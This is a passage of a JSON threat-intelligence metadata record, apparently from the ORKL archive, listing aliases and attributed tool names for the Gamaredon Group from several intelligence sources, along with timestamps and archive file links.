                "UAC-0010",
                "Winterflounder",
                "ACTINIUM",
                "BlueAlpha",
                "IRON TILDEN"
            ],
            "source_name": "MISPGALAXY:Gamaredon Group",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "61940e18-8f90-4ecc-bc06-416c54bc60f9",
            "created_at": "2022-10-25T16:07:23.659529Z",
            "updated_at": "2025-03-27T02:02:09.912404Z",
            "deleted_at": null,
            "main_name": "Gamaredon Group",
            "aliases": [
                "Actinium",
                "Aqua Blizzard",
                "Armageddon",
                "Blue Otso",
                "BlueAlpha",
                "Callisto",
                "DEV-0157",
                "Iron Tilden",
                "Operation STEADY#URSA",
                "Primitive Bear",
                "SectorC08",
                "Shuckworm",
                "Trident Ursa",
                "UAC-0010",
                "Winterflounder"
            ],
            "source_name": "ETDA:Gamaredon Group",
            "tools": [
                "Aversome infector",
                "BoneSpy",
                "DessertDown",
                "DilongTrash",
                "DinoTrain",
                "EvilGnome",
                "FRAUDROP",
                "Gamaredon",
                "GammaDrop",
                "GammaLoad",
                "GammaSteel",
                "Gussdoor",
                "ObfuBerry",
                "ObfuMerry",
                "PlainGnome",
                "PowerPunch",
                "Pteranodon",
                "Pterodo",
                "QuietSieve",
                "Remote Manipulator System",
                "Resetter",
                "RuRAT",
                "SUBTLE-PAWS",
                "UltraVNC"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "08c8f238-1df5-4e75-b4d8-276ebead502d",
            "created_at": "2023-01-06T13:46:39.344081Z",
            "updated_at": "2025-03-27T02:00:03.056208Z",
            "deleted_at": null,
            "main_name": "Copy-Paste",
            "aliases": [],
            "source_name": "MISPGALAXY:Copy-Paste",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "236a8303-bf12-4787-b6d0-549b44271a19",
            "created_at": "2024-06-04T02:03:07.966137Z",
            "updated_at": "2025-03-27T02:05:17.410356Z",
            "deleted_at": null,
            "main_name": "IRON TILDEN",
            "aliases": [
                "Aqua Blizzard ",
                "Armageddon",
                "Blue Otso ",
                "BlueAlpha ",
                "Dancing Salome ",
                "Gamaredon",
                "Gamaredon Group",
                "Hive0051 ",
                "Primitive Bear ",
                "Shuckworm ",
                "Trident Ursa ",
                "UAC-0010 ",
                "UNC530 ",
                "WinterFlounder ",
                "ACTINIUM "
            ],
            "source_name": "Secureworks:IRON TILDEN",
            "tools": [
                "Pterodo"
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1673535577,
    "ts_updated_at": 1743041637,
    "ts_creation_date": 1653712820,
    "ts_modification_date": 1653712820,
    "files": {
        "pdf": "https://archive.orkl.eu/b6949caa2c9818f99a8a1ab3807114e5f1d810b6.pdf",
        "text": "https://archive.orkl.eu/b6949caa2c9818f99a8a1ab3807114e5f1d810b6.txt",
        "img": "https://archive.orkl.eu/b6949caa2c9818f99a8a1ab3807114e5f1d810b6.jpg"
    }
}